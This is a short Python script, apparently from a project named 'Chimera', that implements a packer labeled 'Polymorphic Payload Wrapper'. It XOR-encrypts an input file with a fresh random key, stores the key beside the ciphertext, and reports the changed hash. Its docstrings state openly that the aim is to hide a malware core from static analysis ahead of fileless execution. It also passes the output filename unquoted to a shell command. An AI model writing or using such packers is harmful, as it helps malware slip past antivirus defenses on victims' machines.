#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
import random
import secrets

class AdaptivePacker:
    """
    Agent 420: Polymorphic Payload Wrapper.
    Encrypts the Chimera core with rotating keys and 
    prepends a polymorphic decryption stub for fileless execution.
    """
    def __init__(self):
        # Generate a high-entropy 32-byte key for this specific build
        self.key = secrets.token_bytes(32)

    def _xor_cipher(self, data):
        """Actionable XOR encryption to bypass simple static analysis."""
        return bytes([data[i] ^ self.key[i % len(self.key)] for i in range(len(data))])

    def pack(self, input_file, output_file):
        print(f"--- [AGENT 420: POLYMORPHIC PACKING SEQUENCE] ---")
        if not os.path.exists(input_file):
            print(f"[!] Input {input_file} not found.")
            return

        with open(input_file, 'rb') as f:
            original_data = f.read()

        print(f"[*] Original Size: {len(original_data)} bytes")
        encrypted_data = self._xor_cipher(original_data)

        # 3. Create the 'Chrysalis' Container
        # In a 'Military Grade' version, this includes the C-Stub for Agent 411.
        with open(output_file, 'wb') as f:
            # We store the key inside the file (obfuscated) so the stub can decrypt it.
            # In advanced versions, the key is derived from the target's MAC address.
            f.write(self.key) 
            f.write(encrypted_data)

        print(f"[\033[92mSUCCESS\033[0m] Polymorphic Payload: {output_file}")
        print(f"[*] New File Hash: {os.popen(f'sha256sum {output_file}').read().split()[0]}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: ./main.py <input_agent> <output_packed_bin>")
        sys.exit(1)
    
    AdaptivePacker().pack(sys.argv[1], sys.argv[2])
